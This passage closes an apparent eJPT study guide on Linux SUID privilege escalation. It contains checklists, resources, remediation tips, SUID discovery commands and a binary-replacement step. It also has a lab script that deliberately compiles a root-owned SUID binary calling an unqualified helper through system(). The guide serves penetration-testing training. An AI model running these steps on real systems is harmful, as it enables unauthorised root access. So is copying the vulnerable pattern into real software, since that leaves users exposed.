chmod -s /home/student/welcome    # Remove SUID bit
rm /home/student/welcome          # Remove vulnerable binary

# Code fixes (for developers):
// Instead of: system("greetings");
// Use: system("/usr/local/bin/greetings");

// Better approach: avoid system() entirely
execve("/usr/local/bin/greetings", args, env);
```
```

---

## ðŸŽ“ Study Guide for eJPT Success

### **Essential Knowledge Checklist:**
- [ ] Understand Linux file permissions (read, write, execute)
- [ ] Know what SUID and SGID bits do
- [ ] Can identify SUID binaries using find command
- [ ] Understand how to analyze binaries with strings
- [ ] Know common binary replacement attack techniques
- [ ] Can verify privilege escalation success
- [ ] Understand path hijacking vulnerabilities
- [ ] Know how to document findings properly

### **Practical Skills Checklist:**
- [ ] Can find SUID binaries in under 2 minutes
- [ ] Can analyze binary behavior using strings command
- [ ] Can execute binary replacement attacks successfully
- [ ] Can verify root access after exploitation
- [ ] Can navigate file system with elevated privileges
- [ ] Can read restricted files (like /etc/shadow)
- [ ] Can create simple automation scripts
- [ ] Can write clear technical reports

### **Practice Scenarios:**
1. **Basic Home Directory SUID:** Simple binary in user's home
2. **System-wide SUID Search:** Finding binaries across entire system
3. **Complex Binary Analysis:** Multi-step program analysis
4. **Failed Exploitation Recovery:** Troubleshooting when attacks fail
5. **Multiple SUID Options:** Choosing best target from several options

### **Time Management for Exam:**
- **SUID Discovery:** Maximum 3 minutes
- **Binary Analysis:** Maximum 3 minutes  
- **Exploitation Attempt:** Maximum 4 minutes
- **Verification:** Maximum 1 minute
- **Documentation:** Remaining time for flag retrieval

### **Common Exam Pitfalls:**
- Spending too much time on analysis instead of trying exploitation
- Not checking obvious locations like home directory first
- Missing simple binary replacement opportunities
- Forgetting to verify privilege escalation worked
- Not documenting commands and results for reporting

---

## ðŸ”— Additional Learning Resources

### **Hands-on Practice Platforms:**
- **OverTheWire Bandit:** Excellent for basic Linux skills
- **TryHackMe:** Search for "Linux PrivEsc" rooms
- **HackTheBox:** Look for Easy-rated Linux machines
- **VulnHub:** Download Linux VMs with SUID challenges
- **PentesterLab:** UNIX privilege escalation exercises

### **Setting Up Personal Practice Lab:**
```bash
# Create practice environment on your own Linux system
# WARNING: Only do this on test systems, never production!

# Create vulnerable SUID binary (practice only)
cat > vulnerable.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() {
    printf("Running command...\n");
    system("helper_program");
    return 0;
}
EOF

# Compile and set SUID
gcc vulnerable.c -o vulnerable
sudo chown root:root vulnerable
sudo chmod 4755 vulnerable

# Create helper program
echo '#!/bin/bash' > helper_program
echo 'echo "Normal behavior"' >> helper_program
chmod +x helper_program

# Now practice the exploitation!
```

### **Recommended Reading:**
- "The Linux Command Line" by William Shotts
- "Linux Basics for Hackers" by OccupyTheWeb
- "Hacking: The Art of Exploitation" by Jon Erickson
- Online: Linux File Permissions Tutorial
- Man pages: `man find`, `man chmod`, `man strings`

### **Video Learning Resources:**
- YouTube: "Linux Privilege Escalation" tutorials
- Cybrary: Linux penetration testing courses  
- INE: eJPT preparation materials
- Pluralsight: Linux security fundamentals
- Udemy: Ethical hacking courses with Linux focus

### **Community and Support:**
- **Reddit:** r/eJPT, r/penetrationtesting, r/linuxquestions
- **Discord:** Penetration testing study groups
- **Forums:** Ethical hacking communities
- **Stack Overflow:** Technical Linux questions
- **InfoSec Twitter:** Follow Linux security researchers

---

## ðŸ†˜ Emergency Reference and Troubleshooting

### **When Nothing Works - Emergency Checklist:**
1. **Verify basic access:** `whoami`, `pwd`, `ls -la`
2. **Check for any SUID binaries:** `find . -type f -perm -4000`
3. **Try different search locations:** `/tmp`, `/opt`, `/var`
4. **Look for recent files:** `find / -type f -perm -4000 -newer /etc/passwd`
5. **Check for alternative escalation:** `sudo -l`, kernel exploits

### **Quick Commands for Exam Stress:**
```bash
# When you forget the find syntax:
find / -name "*" -perm -4000 2>/dev/null

# When strings gives too much output:
strings binary_name | head -30

# When you need to verify SUID bit:
ls -la binary_path | grep "s"

# When exploitation seems to fail:
echo $?  # Check exit code
id       # Verify current privileges
```

### **Final Exam Day Tips:**
- **Stay calm** - SUID exploitation is methodical, not rushed
- **Read carefully** - Pay attention to file paths and permissions
- **Test quickly** - Don't overthink, try the obvious approach first
- **Document everything** - Save commands and outputs for reporting
- **Verify thoroughly** - Make sure privilege escalation actually worked

---

## ðŸŽ¯ Final Notes for eJPT Success

SUID/SGID exploitation is a fundamental Linux privilege escalation technique that appears frequently in penetration testing scenarios and eJPT exam situations. The key to success is understanding the systematic approach:

**Discovery â†’ Analysis â†’ Exploitation â†’ Verification**

### **Core Success Principles:**
- **Systematic enumeration** finds targets efficiently
- **Quick analysis** identifies exploitable behaviors
- **Simple techniques** often work better than complex ones
- **Verification confirms** successful privilege escalation
- **Documentation proves** the security impact

### **Most Important Commands to Remember:**
```bash
find / -type f -perm -4000 2>/dev/null   # SUID discovery
strings binary_name                       # Binary analysis  
cp /bin/bash replacement                  # Binary replacement
./vulnerable_program                      # Exploitation execution
whoami && id                             # Privilege verification
```

This comprehensive guide provides everything needed to master SUID/SGID exploitation for both professional penetration testing engagements and eJPT exam success. Regular practice with real systems will build the confidence and technical skills needed to identify and exploit these vulnerabilities efficiently under time pressure.

Remember: The goal is not just to find vulnerabilities, but to understand their impact and be able to clearly demonstrate and document the security risks they represent to an organization.
